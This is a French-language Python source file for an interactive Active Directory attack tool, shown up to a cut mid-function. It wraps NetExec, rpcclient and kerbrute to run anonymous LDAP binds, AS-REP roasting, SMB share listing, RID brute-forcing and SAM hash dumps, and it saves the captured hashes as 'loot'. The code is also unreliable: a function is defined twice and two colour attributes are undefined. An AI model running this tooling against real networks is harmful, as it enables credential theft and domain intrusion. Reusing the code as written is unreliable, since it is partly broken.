#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import argparse
import socket
import threading
import logging
from datetime import datetime
import ipaddress
import sys
import subprocess
import shutil
import re
import os

try:
    from prompt_toolkit import PromptSession
    from prompt_toolkit.history import FileHistory
    from prompt_toolkit.auto_suggest import AutoSuggestFromHistory
    from prompt_toolkit.completion import WordCompleter, NestedCompleter
    from prompt_toolkit.styles import Style
except ImportError:
    print("Erreur: La librairie 'prompt_toolkit' n'est pas installée.")
    print("Veuillez l'installer avec : pip install prompt_toolkit")
    sys.exit(1)

# Configuration du logging
LOG_FILE = "ad_explorer.log"
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s",
    handlers=[
        logging.FileHandler(LOG_FILE),
        logging.StreamHandler()
    ]
)

# Définition des ports des services AD courants
SERVICE_PORTS = {
    "SMB": [139, 445],
    "LDAP": [389],
    "LDAPS": [636],
    "MSSQL": [1433],
    "RDP": [3389],
    "WinRM_HTTP": [5985],
    "WinRM_HTTPS": [5986],
    "RPC_Mapper": [135],
    "DNS": [53], # TCP & UDP
    "Kerberos": [88], # TCP & UDP
    "GlobalCatalog_LDAP": [3268],
    "GlobalCatalog_LDAPS": [3269],
}

# Style pour prompt_toolkit
cli_style = Style.from_dict({
    'prompt': 'ansiblue bold',
    'prompt.arg': 'ansigreen bold', # Pour les sous-prompts
    '': '#ffffff', # Default text
    'bottom-toolbar': 'bg:#333333 #ffffff',
})

# --- Couleurs ANSI (pour la sortie non-prompt_toolkit) ---
class AnsiColors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    ENDC = '\033[0m'
    NO_COLOR_MODE = False

# Gestionnaire d'identifiants (simple, pour la session en cours)
# Dans une application réelle, envisager un stockage plus sécurisé si persistance nécessaire
credentials = {
    "username": None,
    "password": None,
    "domain": None
}

# Nouvelle structure pour les tests d'identifiants multiples
multi_credentials = {
    "users": [],
    "passwords": [],
    "hashes": [],
    "users_file": None,
    "passwords_file": None,
    "hashes_file": None,
    "domain": None # Le domaine est partagé
}

# --- Fonctions Utilitaires ---
def check_command_exists(command):
    """Vérifie si une commande externe existe dans le PATH."""
    if shutil.which(command) is None:
        logging.warning(f"La commande '{command}' ne semble pas être installée ou n'est pas dans le PATH.")
        print(f"[!] Attention: La commande '{command}' est introuvable. Certaines fonctionnalités pourraient ne pas être disponibles.")
        return False
    return True

NXC_AVAILABLE = False
RPCCLIENT_AVAILABLE = False
KERBRUTE_AVAILABLE = False
IMPACKET_EXAMPLES_AVAILABLE = False # Pour ldp.py etc.

def get_nxc_executable():
    """Retourne 'nxc' ou 'netexec' en fonction de ce qui est disponible."""
    if shutil.which("nxc"):
        return "nxc"
    elif shutil.which("netexec"):
        return "netexec"
    return "nxc" # Par défaut, même si non trouvé, pour la construction de commandes

NXC_CMD = get_nxc_executable()

# Répertoire pour sauvegarder les "loots" (hashes, etc.)
LOOT_DIR = "ad_explorer_loot"
os.makedirs(LOOT_DIR, exist_ok=True)

def get_target_loot_dir(target_ip):
    """Crée et retourne le chemin du répertoire de loot spécifique à la cible."""
    target_loot_path = os.path.join(LOOT_DIR, target_ip.replace('.', '_'))
    os.makedirs(target_loot_path, exist_ok=True)
    return target_loot_path

def run_command(command_list, shell=False, capture_output=True, text=True, check=False):
    """Exécute une commande externe et retourne sa sortie, son code de retour, et la chaîne de commande."""
    command_str = command_list if shell else " ".join(map(str, command_list)) # Convertir tous les éléments en str
    logging.info(f"Exécution de la commande: {command_str}")
    print(f"[*] Exécution: {command_str}")
    try:
        process = subprocess.Popen(
            command_list,
            stdout=subprocess.PIPE if capture_output else None,
            stderr=subprocess.PIPE if capture_output else None,
            text=text,
            shell=shell
        )
        stdout, stderr = process.communicate()
        ret_code = process.returncode

        if ret_code != 0 and stderr:
            # Afficher stderr si la commande a échoué et a produit une erreur
            # Cela aide à déboguer directement depuis la console d'ADExplorer
            print(f"{AnsiColors.RED}  Erreur de la commande ({ret_code}): {stderr.strip()}{AnsiColors.ENDC}")
            logging.warning(f"Commande '{command_str}' terminée avec code {ret_code}. Erreur: {stderr.strip()}")


        # Retourner la chaîne de commande avec la sortie et le code de retour
        return command_str, stdout, stderr, ret_code
    except FileNotFoundError:
        logging.error(f"Commande non trouvée: {command_list[0]}")
        print(f"{AnsiColors.RED}[-] Commande non trouvée: {command_list[0]}. Assurez-vous qu'elle est installée et dans le PATH.{AnsiColors.ENDC}")
        return command_str, None, f"Commande non trouvée: {command_list[0]}", -1 # Code d'erreur personnalisé
    except Exception as e:
        logging.error(f"Erreur lors de l'exécution de la commande '{command_str}': {e}")
        print(f"[-] Erreur lors de l'exécution: {e}")
        return command_str, None, str(e), -1 # Code d'erreur personnalisé

def format_status(success_flag, text_if_success="Succès", text_if_failure="Échec", text_if_partial="Partiel/Info"):
    """Formate le statut avec des couleurs."""
    if success_flag is True: # Explicitement True pour succès
        return f"{AnsiColors.GREEN}[+] {text_if_success}{AnsiColors.ENDC}"
    elif success_flag is None: # Pour un statut partiel ou informatif
        return f"{AnsiColors.YELLOW}[~] {text_if_partial}{AnsiColors.ENDC}"
    else: # False pour échec
        return f"{AnsiColors.RED}[-] {text_if_failure}{AnsiColors.ENDC}"

def run_preliminary_scan(target_ip, scanned_ports_info, session):
    """Effectue une série d'énumérations préliminaires rapides et affiche un tableau de statut."""
    logging.info(f"Exécution du scan préliminaire sur {target_ip}")
    print(f"\n[*] Scan préliminaire Active Directory pour {AnsiColors.CYAN}{target_ip}{AnsiColors.ENDC}:")

    prelim_results = []
    target_loot_dir = get_target_loot_dir(target_ip)
    domain_from_ldap = credentials.get("domain") 

    # Modifié pour inclure executed_command et raw_output
    def add_result(description, status_flag, details="", executed_command=None, raw_output=None, success_text="Succès", failure_text="Échec", partial_text="Info"):
        status_str = format_status(status_flag, text_if_success=success_text, text_if_failure=failure_text, text_if_partial=partial_text)
        prelim_results.append({
            "description": description, 
            "status": status_str, 
            "details": details,
            "executed_command": executed_command,
            "raw_output": raw_output if raw_output and raw_output.strip() else None # Ne stocker que si non vide
        })

    # --- Tests LDAP ---
    ldap_ports_to_try = scanned_ports_info.get("LDAP", []) + scanned_ports_info.get("LDAPS", [])

    if ldap_ports_to_try:
        # 1.a Liaison LDAP Anonyme & Infos de Base
        ldap_anon_status = False # True si succès, False si échec, None si partiel/info
        ldap_anon_details = ""
        ldap_anon_cmd_str, ldap_anon_output = None, None
        
        for port in ldap_ports_to_try:
            cmd_ldap_anon = [NXC_CMD, "ldap", f"{target_ip}:{port}", "-u", "", "-p", ""]
            ldap_anon_cmd_str, ldap_anon_output, _, ret_code = run_command(cmd_ldap_anon)
            if ldap_anon_output and (ret_code == 0 or "Naming Contexts" in ldap_anon_output or "defaultNamingContext" in ldap_anon_output):
                ldap_anon_status = True
                ldap_anon_details += f"Connexion anonyme OK (port {port}). "
                dc_match = re.search(r"(?:defaultNamingContext|namingContexts):\s*DC=([^,]+),DC=([^,]+)", ldap_anon_output, re.IGNORECASE)
                if dc_match and not domain_from_ldap:
                    domain_from_ldap = f"{dc_match.group(1)}.{dc_match.group(2)}".lower()
                    credentials["domain"] = domain_from_ldap
                    multi_credentials["domain"] = domain_from_ldap
                    ldap_anon_details += f"Domaine déduit et mis à jour: {domain_from_ldap}. "
                break 
            elif ret_code != 0 : # Échec de la commande
                ldap_anon_status = False
                ldap_anon_details = "Échec de la commande de liaison anonyme."
                break # Pas besoin de tester d'autres ports si la commande elle-même échoue
        add_result("LDAP: Liaison Anonyme", ldap_anon_status, ldap_anon_details.strip(), 
                   executed_command=ldap_anon_cmd_str, raw_output=ldap_anon_output if ldap_anon_status else None,
                   failure_text="Échec/Non Permis")

        # 1.b Politique de Mots de Passe (LDAP Anonyme)
        pass_pol_status = False
        pass_pol_details = ""
        pass_pol_cmd_str, pass_pol_output = None, None
        if ldap_anon_status is True: # Tenter seulement si la liaison anonyme a fonctionné
            for port in ldap_ports_to_try: 
                cmd_pass_pol = [NXC_CMD, "ldap", f"{target_ip}:{port}", "-u", "", "-p", "", "--pass-pol"]
                pass_pol_cmd_str, pass_pol_output, _, ret_code = run_command(cmd_pass_pol)
                if pass_pol_output and ret_code == 0 and ("Password Policy" in pass_pol_output or "minPwdLength" in pass_pol_output):
                    pass_pol_status = True
                    min_len_match = re.search(r"MinimumPasswordLength:\s*(\d+)", pass_pol_output, re.IGNORECASE)
                    lockout_match = re.search(r"LockoutThreshold:\s*(\d+)", pass_pol_output, re.IGNORECASE)
                    pass_pol_details += f"Politique trouvée (port {port}). "
                    if min_len_match: pass_pol_details += f"Longueur min: {min_len_match.group(1)}. "
                    if lockout_match: pass_pol_details += f"Seuil verrouillage: {lockout_match.group(1)}. "
                    break
                elif ret_code == 0: # Commande exécutée mais politique non trouvée
                    pass_pol_status = None # Partiel/Info
                    pass_pol_details = "Commande exécutée, politique non explicitement trouvée ou non parsable."
                    break
                elif ret_code !=0:
                    pass_pol_status = False
                    pass_pol_details = "Échec de la commande --pass-pol."
                    break
        add_result("LDAP: Politique Mots de Passe (Anonyme)", pass_pol_status, pass_pol_details.strip(),
                   executed_command=pass_pol_cmd_str, raw_output=pass_pol_output if pass_pol_status is not False else None, # Afficher la sortie si succès ou info
                   failure_text="Échec/Non Obtenue", partial_text="Exécuté, non trouvée")

        # 1.c AS-REP Roasting (LDAP Anonyme)
        asrep_status = False
        asrep_details = ""
        asrep_cmd_str, asrep_output_display = None, None
        if domain_from_ldap: 
            asrep_file = os.path.join(target_loot_dir, f"asreproast_hashes_anon_{target_ip}.txt")
            for port in ldap_ports_to_try:
                cmd_asrep = [NXC_CMD, "ldap", f"{target_ip}:{port}", "-d", domain_from_ldap, "-u", "", "-p", "", "--asreproast", asrep_file]
                asrep_cmd_str, asrep_output, _, ret_code = run_command(cmd_asrep)
                asrep_output_display = asrep_output # Garder la sortie pour affichage
                if ret_code == 0 and os.path.exists(asrep_file) and os.path.getsize(asrep_file) > 0:
                    asrep_status = True
                    asrep_details = f"Hashes AS-REP potentiels sauvegardés dans {asrep_file}"
                    break
                elif ret_code == 0 and ("No users found without Kerberos preauthentication" in asrep_output or "No users found vulnerable to ASREPRoast" in asrep_output):
                    asrep_status = None # Partiel/Info
                    asrep_details = "Aucun utilisateur vulnérable à AS-REP Roasting trouvé."
                    if os.path.exists(asrep_file): os.remove(asrep_file) # Supprimer fichier vide
                    break
                elif ret_code != 0:
                    asrep_status = False
                    asrep_details = "Échec de la commande --asreproast."
                    if os.path.exists(asrep_file) and os.path.getsize(asrep_file) == 0 : os.remove(asrep_file)
                    break
            add_result(f"LDAP: AS-REP Roasting (Anonyme, {domain_from_ldap})", asrep_status, asrep_details,
                       executed_command=asrep_cmd_str, raw_output=asrep_output_display if asrep_status is not False else None,
                       failure_text="Échec/Erreur", partial_text="Exécuté, non vulnérable")
        else:
            add_result("LDAP: AS-REP Roasting (Anonyme)", None, "Domaine non découvert", partial_text="Non testé")
    else:
        add_result("LDAP: Tests", None, "Port LDAP/S non détecté", partial_text="Non testé")

    # --- Tests SMB ---
    smb_ports_to_try = scanned_ports_info.get("SMB", [])
    if smb_ports_to_try:
        smb_auth_methods = [
            {"name": "Anonyme", "user": "", "pass": ""},
            {"name": "Guest", "user": "Guest", "pass": ""}
        ]

        for auth in smb_auth_methods:
            auth_name = auth["name"]
            user, password = auth["user"], auth["pass"]
            
            # 2.a Partages SMB
            shares_status, shares_details, shares_cmd, shares_raw_out = False, "", None, None
            for port in smb_ports_to_try:
                cmd_shares = [NXC_CMD, "smb", f"{target_ip}:{port}", "-u", user, "-p", password, "--shares"]
                shares_cmd, shares_raw_out, _, ret_code = run_command(cmd_shares)
                if shares_raw_out and ret_code == 0:
                    found_shares_list = [line.split()[0] for line in shares_raw_out.splitlines() if "$" in line or "READ" in line or "WRITE" in line or "ACCESS_DENIED" not in line.upper()]
                    if found_shares_list and not any("ACCESS_DENIED" in s.upper() for s in found_shares_list): # Succès si partages trouvés et pas d'accès refusé
                        shares_status = True
                        shares_details += f"Partages trouvés (port {port}): {', '.join(list(set(found_shares_list)))}. "
                    else: # Commande OK mais pas de partages clairs ou accès refusé
                        shares_status = None
                        shares_details += f"Connexion SMB OK (port {port}), pas de partages accessibles ou listés. "
                    break 
                elif ret_code != 0:
                    shares_status = False
                    shares_details = "Échec de la commande --shares."
                    break
            add_result(f"SMB: Partages ({auth_name})", shares_status, shares_details.strip(),
                       executed_command=shares_cmd, raw_output=shares_raw_out if shares_status is not False else None,
                       failure_text="Échec/Non Permis", partial_text="Exécuté, non trouvés/permis")

            # 2.b Heure du Serveur SMB
            time_status, time_details, time_cmd, time_raw_out = False, "", None, None
            for port in smb_ports_to_try:
                cmd_time = [NXC_CMD, "smb", f"{target_ip}:{port}", "-u", user, "-p", password, "--time"]
                time_cmd, time_raw_out, _, ret_code = run_command(cmd_time)
                if time_raw_out and ret_code == 0:
                    time_match = re.search(r"Host time:\s*(.*)", time_raw_out, re.IGNORECASE)
                    if time_match:
                        time_status = True
                        time_details += f"Heure (port {port}): {time_match.group(1).strip()}. "
                    else:
                        time_status = None
                        time_details += f"Commande --time exécutée (port {port}), heure non parsée. "
                    break
                elif ret_code != 0:
                    time_status = False
                    time_details = "Échec de la commande --time."
                    break
            add_result(f"SMB: Heure du Serveur ({auth_name})", time_status, time_details.strip(),
                       executed_command=time_cmd, raw_output=time_raw_out if time_status is not False else None,
                       failure_text="Échec/Non Obtenue", partial_text="Exécuté, non parsée")

            # 2.c RID Brute SMB
            rid_status, rid_details, rid_cmd, rid_raw_out = False, "", None, None
            for port in smb_ports_to_try:
                cmd_rid = [NXC_CMD, "smb", f"{target_ip}:{port}", "-u", user, "-p", password, "--rid-brute"]
                rid_cmd, rid_raw_out, _, ret_code = run_command(cmd_rid)
                if ret_code == 0: 
                    if rid_raw_out and (re.search(r"\[\+\] Found user:", rid_raw_out) or re.search(r"SidTypeUser", rid_raw_out)):
                        rid_status = True
                        rid_details += f"Utilisateurs potentiels trouvés via RID Brute (port {port}). "
                    else:
                        rid_status = None # Exécuté mais rien trouvé
                        rid_details += f"RID Brute exécuté (port {port}), aucun utilisateur explicitement listé. "
                    break
                elif ret_code != 0:
                    rid_status = False
                    rid_details = "Échec de la commande --rid-brute."
                    break
            add_result(f"SMB: RID Brute ({auth_name})", rid_status, rid_details.strip(),
                       executed_command=rid_cmd, raw_output=rid_raw_out if rid_status is not False else None,
                       failure_text="Échec/Erreur", partial_text="Exécuté, rien trouvé")

            # 2.d Dump SAM Hashes SMB (tentative)
            sam_status, sam_details, sam_cmd, sam_raw_out = False, "", None, None
            for port in smb_ports_to_try:
                cmd_sam = [NXC_CMD, "smb", f"{target_ip}:{port}", "-u", user, "-p", password, "--sam"]
                sam_cmd, sam_raw_out, _, ret_code = run_command(cmd_sam)
                if sam_raw_out and ret_code == 0 and re.search(r"\$[0-9a-fA-F]+\*+\*[0-9a-fA-F]+", sam_raw_out): 
                    sam_status = True
                    sam_details += f"Hashes SAM potentiels trouvés (port {port}). "
                    break
                elif ret_code == 0 : 
                    sam_status = None
                    sam_details += f"Tentative --sam (port {port}) exécutée, pas de hashes évidents ou accès refusé. "
                    # Ne pas break ici, on veut voir la sortie même si c'est un accès refusé
                elif ret_code != 0:
                    sam_status = False
                    sam_details = "Échec de la commande --sam."
                    break # Break si la commande elle-même échoue
            add_result(f"SMB: Dump SAM Hashes ({auth_name})", sam_status, sam_details.strip(),
                       executed_command=sam_cmd, raw_output=sam_raw_out if sam_status is not False else None, # Afficher la sortie même si accès refusé
                       failure_text="Échec/Erreur", partial_text="Exécuté, non trouvés/permis")
    else:
        add_result("SMB: Tests", None, "Port SMB non détecté", partial_text="Non testé")
    
    # Affichage des résultats
    print("\n--- Résultats du Scan Préliminaire ---")
    max_desc_len = 0
    if prelim_results:
        max_desc_len = max(len(r["description"]) for r in prelim_results)

    for res in prelim_results:
        print(f"  {res['description']:<{max_desc_len}} : {res['status']}")
        if res.get("details"):
            print(f"    {AnsiColors.WHITE}Détails: {res['details']}{AnsiColors.ENDC}")
        
        # Afficher la commande et la sortie si elles existent et sont pertinentes
        if res.get("executed_command"):
            print(f"      {AnsiColors.GRAY}Commande: {res['executed_command']}{AnsiColors.ENDC}")
        if res.get("raw_output"): # Afficher la sortie si elle existe
            print(f"      {AnsiColors.BLUE}Sortie Brute:{AnsiColors.ENDC}\n{AnsiColors.GRAY}      {'-'*20}\n      {res['raw_output'].strip().replace('\n', '\n      ')}\n      {'-'*20}{AnsiColors.ENDC}")
    print("--- Fin du Scan Préliminaire ---\n")

    # Demander à l'utilisateur s'il veut mettre à jour le domaine global si trouvé
    # Ceci est déjà fait dans la section LDAP ci-dessus.

def user_discovery_mode(target_ip, session):
    """Menu pour les techniques de découverte d'utilisateurs."""
    user_discovery_commands_help = {
        "help": "Afficher ce message d'aide.",
        "kerbrute_userenum <wordlist> [domain]": "Utiliser Kerbrute pour l'énumération d'utilisateurs (nécessite un domaine).",
        "rpc_enumdomusers [user] [pass] [domain]": "Utiliser rpcclient enumdomusers (identifiants optionnels).",
        "rpc_enumdomusers_current_creds": "Utiliser rpcclient enumdomusers avec les identifiants actuels.",
        "rid_brute_anon": "Effectuer un RID brute-force SMB en anonyme.",
        "rid_brute_creds <user> <pass> [domain]": "Effectuer un RID brute-force SMB avec les identifiants fournis.",
        "rid_brute_current_creds": "Effectuer un RID brute-force SMB avec les identifiants actuels.",
        "run_all_discovery": "Exécuter toutes les techniques de découverte d'utilisateurs non authentifiées ou avec les identifiants actuels.",
        "back": "Retourner au menu principal de la cible."
    }
    user_discovery_completer = WordCompleter(list(user_discovery_commands_help.keys()), ignore_case=True)

    while True:
        try:
            full_command = session.prompt(
                f"ADExplorer ({AnsiColors.YELLOW}{target_ip}{AnsiColors.ENDC}) ({AnsiColors.CYAN}UserDiscovery{AnsiColors.ENDC})> ",
                completer=user_discovery_completer,
                auto_suggest=AutoSuggestFromHistory(),
                style=cli_style
            ).strip()
            if not full_command:
                continue
            
            parts = full_command.split()
            command = parts[0].lower()
            interactive_cmd_args = parts[1:]

            logging.info(f"Commande UserDiscovery reçue pour {target_ip}: {full_command}")

            if command == "help":
                print_target_menu({"Commandes de Découverte d'Utilisateurs": user_discovery_commands_help})
            elif command == "back":
                break
            elif command == "exit":
                logging.info("Demande de sortie de l'application.")
                print("Au revoir !")
                sys.exit(0)
            elif command == "kerbrute_userenum":
                if not KERBRUTE_AVAILABLE:
                    print(f"{AnsiColors.RED}[-] Kerbrute n'est pas disponible.{AnsiColors.ENDC}")
                    continue
                if not interactive_cmd_args:
                    print("Usage: kerbrute_userenum <wordlist> [domain]")
                    continue
                wordlist_path = interactive_cmd_args[0]
                domain_to_use = interactive_cmd_args[1] if len(interactive_cmd_args) > 1 else credentials.get("domain") or multi_credentials.get("domain")
                if not domain_to_use:
                    print(f"{AnsiColors.RED}[-] Domaine non spécifié et non configuré globalement.{AnsiColors.ENDC}")
                    continue
                if not os.path.exists(wordlist_path):
                    print(f"{AnsiColors.RED}[-] Fichier wordlist introuvable: {wordlist_path}{AnsiColors.ENDC}")
                    continue
                
                cmd_kerbrute = ["kerbrute", "userenum", "--dc", target_ip, "-d", domain_to_use, wordlist_path]
                run_command(cmd_kerbrute) # Affichage en temps réel

            elif command == "rpc_enumdomusers" or command == "rpc_enumdomusers_current_creds":
                if not RPCCLIENT_AVAILABLE:
                    print(f"{AnsiColors.RED}[-] rpcclient n'est pas disponible.{AnsiColors.ENDC}")
                    continue
                
                user, password, domain = "", "", credentials.get("domain") or multi_credentials.get("domain")

                if command == "rpc_enumdomusers_current_creds":
                    user = credentials.get("username") or ""
                    password = credentials.get("password") or ""
                    if not user and not password: # Si les identifiants actuels sont vides, on tente en anonyme
                        print("[*] Identifiants actuels non définis, tentative en anonyme pour rpc_enumdomusers.")
                        user, password = "", "" 
                elif interactive_cmd_args: # Pour rpc_enumdomusers avec args
                    user = interactive_cmd_args[0]
                    password = interactive_cmd_args[1] if len(interactive_cmd_args) > 1 else ""
                    if len(interactive_cmd_args) > 2:
                        domain = interactive_cmd_args[2]
                
                # Construire la commande rpcclient
                # rpcclient -U "DOMAIN\user%password" -c "enumdomusers" <target_ip>
                # Si user est vide, on tente une session nulle : -U "" ou -U "%"
                auth_str = ""
                if user: # Si un utilisateur est fourni (même vide pour session nulle explicite)
                    if domain:
                        auth_str = f"{domain}\\{user}%{password}"
                    else: # Si pas de domaine, on suppose que l'utilisateur est local ou que le DC le gère
                        auth_str = f"{user}%{password}"
                else: # Anonyme
                    auth_str = "%" # Pour rpcclient, juste % pour anonyme ou user vide

                cmd_rpc = ["rpcclient", "-U", auth_str, "-c", "enumdomusers", target_ip]
                run_command(cmd_rpc)
            
            elif command.startswith("rid_brute"):
                if not NXC_AVAILABLE:
                    print(f"{AnsiColors.RED}[-] NetExec (nxc) n'est pas disponible.{AnsiColors.ENDC}")
                    continue

                user_param, pass_param, domain_param = "", "", credentials.get("domain") or multi_credentials.get("domain")

                if command == "rid_brute_anon":
                    print("[*] Tentative de RID brute-force SMB en anonyme...")
                elif command == "rid_brute_current_creds":
                    user_param = credentials.get("username") or ""
                    pass_param = credentials.get("password") or ""
                    if not user_param and not pass_param:
                        print("[*] Identifiants actuels non définis, tentative de RID brute-force en anonyme.")
                    else:
                        print(f"[*] Tentative de RID brute-force SMB avec les identifiants actuels ({domain_param}\\{user_param})...")
                elif command == "rid_brute_creds":
                    if len(interactive_cmd_args) < 2:
                        print("Usage: rid_brute_creds <user> <password> [domain]")
                        continue
                    user_param = interactive_cmd_args[0]
                    pass_param = interactive_cmd_args[1]
                    if len(interactive_cmd_args) > 2:
                        domain_param = interactive_cmd_args[2]
                    print(f"[*] Tentative de RID brute-force SMB avec {domain_param}\\{user_param}...")

                cmd_rid = [NXC_CMD, "smb", target_ip, "-u", user_param, "-p", pass_param, "--rid-brute"]
                if domain_param and user_param : # Le domaine n'est pertinent que si un utilisateur est spécifié
                    cmd_rid.extend(["-d", domain_param])
                
                # Spécifier une plage de RID si nécessaire, sinon nxc utilise des valeurs par défaut
                # cmd_rid.extend(["--rid-brute", "500-1500"]) # Exemple de plage
                run_command(cmd_rid)

            elif command == "run_all_discovery":
                print("[*] Exécution de toutes les techniques de découverte d'utilisateurs (non-auth et avec identifiants actuels)...")
                # Simuler l'appel des commandes appropriées
                # Kerbrute (si domaine connu)
                domain_to_use_kerbrute = credentials.get("domain") or multi_credentials.get("domain")
                if KERBRUTE_AVAILABLE and domain_to_use_kerbrute:
                    print("\n--- Tentative Kerbrute (nécessite une wordlist par défaut ou une configuration)... ---")
                    print("INFO: Kerbrute nécessite une wordlist. Cette exécution 'run_all' ne spécifie pas de wordlist.")
                    print("      Exécutez 'kerbrute_userenum <wordlist>' manuellement pour un scan complet.")
                    # On pourrait avoir une petite wordlist par défaut ici, ou skipper.
                else:
                    print("\n--- Kerbrute non disponible ou domaine non configuré. ---")

                # RPC EnumDomUsers (anonyme et avec identifiants actuels)
                if RPCCLIENT_AVAILABLE:
                    print("\n--- Tentative RPC EnumDomUsers (Anonyme)... ---")
                    run_command(["rpcclient", "-U", "%", "-c", "enumdomusers", target_ip])
                    
                    current_user = credentials.get("username")
                    current_pass = credentials.get("password")
                    current_domain = credentials.get("domain") or multi_credentials.get("domain")
                    if current_user:
                        print("\n--- Tentative RPC EnumDomUsers (Identifiants Actuels)... ---")
                        auth_str_current = f"{current_domain}\\{current_user}%{current_pass}" if current_domain else f"{current_user}%{current_pass}"
                        run_command(["rpcclient", "-U", auth_str_current, "-c", "enumdomusers", target_ip])
                else:
                    print("\n--- rpcclient non disponible. ---")

                # RID Brute (anonyme et avec identifiants actuels)
                if NXC_AVAILABLE:
                    print("\n--- Tentative RID Brute SMB (Anonyme)... ---")
                    run_command([NXC_CMD, "smb", target_ip, "-u", "", "-p", "", "--rid-brute"])

                    current_user_nxc = credentials.get("username") or ""
                    current_pass_nxc = credentials.get("password") or ""
                    current_domain_nxc = credentials.get("domain") or multi_credentials.get("domain")
                    if credentials.get("username"): # Seulement si un utilisateur est défini
                        print("\n--- Tentative RID Brute SMB (Identifiants Actuels)... ---")
                        cmd_rid_current = [NXC_CMD, "smb", target_ip, "-u", current_user_nxc, "-p", current_pass_nxc, "--rid-brute"]
                        if current_domain_nxc:
                            cmd_rid_current.extend(["-d", current_domain_nxc])
                        run_command(cmd_rid_current)
                else:
                    print("\n--- NetExec (nxc) non disponible pour RID Brute. ---")
                print("\n[*] Fin de toutes les découvertes d'utilisateurs.")

            else:
                print(f"Commande inconnue dans le Mode Découverte d'Utilisateurs: {command}. Tapez 'help'.")

        except KeyboardInterrupt:
            print("\n[!] Action annulée dans le Mode Découverte d'Utilisateurs.")
            continue
        except EOFError:
            print("\n[!] Action annulée dans le Mode Découverte d'Utilisateurs.")
            continue
        except Exception as e:
            logging.error(f"Erreur inattendue dans le Mode Découverte d'Utilisateurs: {e}")
            print(f"{AnsiColors.RED}Erreur: {e}{AnsiColors.ENDC}")
            continue

def check_port(ip, port, open_ports_list, service_name):
    """Vérifie si un port TCP est ouvert."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)  # Timeout de 1 seconde
        result = sock.connect_ex((ip, port))
        if result == 0:
            open_ports_list.append((port, service_name))
        sock.close()
    except socket.error as e:
        logging.debug(f"Erreur de socket en scannant {ip}:{port} - {e}")

def initial_scan(target_ip):
    """Effectue un scan initial des ports pour les services AD."""
    logging.info(f"Début du scan initial des services sur {target_ip}")
    print(f"[*] Scan initial des services sur {target_ip}...")

    open_services = {}
    threads = []
    scan_results = [] # Liste pour stocker les résultats des threads (port, service_name)

    for service, ports in SERVICE_PORTS.items():
        for port in ports:
            thread = threading.Thread(target=check_port, args=(target_ip, port, scan_results, service))
            threads.append(thread)
            thread.start()

    for thread in threads:
        thread.join()

    if not scan_results:
        print("[-] Aucun service AD commun détecté.")
        logging.warning(f"Aucun service AD commun détecté sur {target_ip}")
        return {}

    print("\n[+] Services potentiels détectés :")
    for port, service_name in sorted(scan_results):
        print(f"  - Port {port}/tcp ouvert ({service_name})")
        if service_name not in open_services:
            open_services[service_name] = []
        open_services[service_name].append(port)
    
    logging.info(f"Services détectés sur {target_ip}: {open_services}")
    return open_services

# --- Fonctions de Parsing pour la découverte d'utilisateurs ---
def parse_nxc_users_output(output_str):
    """Parse la sortie de nxc --users pour extraire les noms d'utilisateurs."""
    users = set()
    # Exemple de ligne: SMB  10.0.0.5  445  DC01  [*] Users: Administrator, Guest, krbtgt, user1
    # Exemple LDAP: LDAP 10.0.0.5  389  DC01  Users: Administrator (Sid: S-1-5-...), Guest (Sid: S-1-5-...)
    # On cherche la partie après "Users: " ou "users: "
    try:
        users_marker = "Users: "
        if users_marker.lower() not in output_str.lower():
            users_marker = "users: " # Tentative avec minuscule
        
        for line in output_str.splitlines():
            if users_marker.lower() in line.lower():
                # Prend tout ce qui est après "Users: "
                users_part = line.split(users_marker, 1)[-1] if users_marker in line else line.split(users_marker.lower(), 1)[-1]
                # Sépare par virgule, enlève les détails comme (Sid: ...)
                potential_users = [u.split('(')[0].strip() for u in users_part.split(',')]
                for user in potential_users:
                    if user and not user.startswith("S-1-"): # Éviter les SIDs si mal parsés
                        users.add(user)
    except Exception as e:
        logging.error(f"Erreur lors du parsing de la sortie nxc users: {e}")
    return list(users)

def parse_kerbrute_output(output_str):
    """Parse la sortie de kerbrute userenum pour extraire les noms d'utilisateurs valides."""
    users = set()
    # Exemple: 2023/10/27 10:00:01 > [VALID USERNAME] administrator@test.local
    try:
        for line in output_str.splitlines():
            if "[VALID USERNAME]" in line:
                # Extrait ce qui est après "[VALID USERNAME] "
                user_part = line.split("[VALID USERNAME]", 1)[-1].strip()
                # Enlève le domaine si présent (ex: user@domain.com -> user)
                username = user_part.split('@')[0]
                users.add(username)
    except Exception as e:
        logging.error(f"Erreur lors du parsing de la sortie kerbrute: {e}")
    return list(users)

# --- Mode Découverte d'Utilisateurs ---
def user_discovery_menu_help():
    print("\nOptions du Mode Découverte d'Utilisateurs:")
    print("  smbnull             - Énumérer les utilisateurs via SMB (Session Null avec nxc).")
    print("  ldapanon            - Énumérer les utilisateurs via LDAP (Anonyme avec nxc).")
    print("  ldapexist <file>    - Tester l'existence de comptes LDAP depuis un fichier (avec nxc).")
    print("  kerbrute            - Utiliser Kerbrute pour l'énumération d'utilisateurs (si installé).")
    print("  showusers           - Afficher tous les utilisateurs découverts jusqu'à présent.")
    print("  help                - Afficher cette aide.")
    print("  back                - Retourner au menu principal.")

def user_discovery_mode(target_ip, main_session):
    logging.info(f"Entrée dans le Mode Découverte d'Utilisateurs pour {target_ip}")
    
    discovered_users_set = set()

    ud_completer = WordCompleter([
        "smbnull", "ldapanon", "ldapexist", "kerbrute", "showusers", "help", "back"
    ], ignore_case=True)
    
    ud_session = PromptSession(history=FileHistory('.ad_explorer_ud_history'), auto_suggest=AutoSuggestFromHistory(), style=cli_style)

    print(f"\n[*] Mode Découverte d'Utilisateurs pour {target_ip}. Tapez 'help' pour les options.")

    while True:
        try:
            action = ud_session.prompt(f"UserDiscovery ({target_ip})> ", completer=ud_completer).strip().lower()
            if not action:
                continue
            
            cmd_parts = action.split()
            command = cmd_parts[0]

            if command == "back":
                logging.info(f"Sortie du Mode Découverte d'Utilisateurs pour {target_ip}")
                break
            elif command == "help":
                user_discovery_menu_help()
            elif command == "showusers":
                if discovered_users_set:
                    print("\n[+] Utilisateurs découverts :")
                    for user in sorted(list(discovered_users_set)):
                        print(f"  - {user}")
                else:
                    print("[-] Aucun utilisateur découvert pour le moment.")
            
            elif command == "smbnull":
